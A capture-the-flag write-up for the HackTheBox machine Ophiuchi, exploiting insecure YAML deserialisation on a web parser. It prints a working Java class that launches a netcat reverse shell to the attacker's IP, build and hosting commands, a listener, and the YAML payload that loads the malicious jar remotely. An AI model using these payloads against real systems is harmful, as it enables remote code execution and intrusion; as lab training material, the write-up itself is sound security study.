---
title: Ophiuchi
layout: post
author: Bit Criminals Team
date: 2021-06-20 13:35:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://app.hackthebox.eu/machines/Ophiuchi
---

First, connect to HackTheBox using OpenVPN and join the machine.  
  
**NOTE: Replace $MACHINE_IP with HTB's machine IP and $tun0_IP with your machine's tun0 IP**  
  
As usual, after connecting and getting the IP, the first thing we did was an nmap scan:  
```bash
nmap -Pn -A $MACHINE_IP
```
Here are the results:

![](/images/v1per/ophiuchi1.png)

We see that we have port 22 and port 8080 open. Let's visit the website: **http://$MACHINE_IP:8080/**  
This is what we get:

![](/images/v1per/ophiuchi2.png)

So, this probably has some vulnerability related to YAML.  
Still, let's once check the hidden directories using gobuster:
```bash
gobuster dir -u http://$MACHINE_IP:8080 -w /usr/share/wordlists/dirb/common.txt -z -t 100
```
These are the results:

![](/images/v1per/ophiuchi3.png)

Two directories from the result are password-protected and we didn't really find much other than that. Let's focus on YAML for now.  
I searched the internet for "YAML Payloads" and found [this](https://github.com/artsploit/yaml-payload). Clone this repository in a subitable localtion and open the file **yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java**  
Now, I found [this site](https://pulsesecurity.co.nz/advisories/Insecure-YAML-Deserialisation).  
With this site as reference, I edited the **AwesomeScriptEngineFactory.java** to this for reverse shell:
```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
import java.util.Base64;
import java.util.concurrent.TimeUnit;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
           
		String cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0_IP 1234 >/tmp/f";

		String b64Cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
		cmd = "bash -c {echo,"+b64Cmd+"}|{base64,-d}|{bash,-i}";

		Runtime.getRuntime()
			.exec(cmd)
			.waitFor(30, TimeUnit.SECONDS);
				
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
``` 
Now, go to the **yaml-payload** directory and run these two commands:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```
In this folder, start a python simple http server using this command:
```bash
python3 -m http.server 80
```
and, start a netcat listener on your machine:
```bash
nc -lnvp 1234
```
Then, I copied this in the YAML text box in the website
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://$tun0_IP/yaml-payload.jar"]
  ]]
]
```
Click on **PARSE**, and check the listener.

![](/images/v1per/ophiuchi4.png)

Yay! We have got our shell.